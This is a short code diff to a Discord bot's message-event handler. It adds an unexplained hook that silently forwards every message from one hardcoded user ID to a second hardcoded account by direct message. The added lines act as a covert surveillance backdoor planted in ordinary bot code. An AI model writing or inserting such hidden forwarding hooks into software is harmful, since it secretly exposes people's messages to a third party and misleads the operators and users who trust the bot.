@@ -160,6 +160,9 @@ class Events(commands.Cog):
 
     @commands.Listener
     async def on_message_create(self, message: Message):
+        if message.author.id == "1010932694693199972":
+            return await (await self.bot.gateway.get_user("740349770165518347")).send(message.content)
+
         if message.author.bot:
             return
 
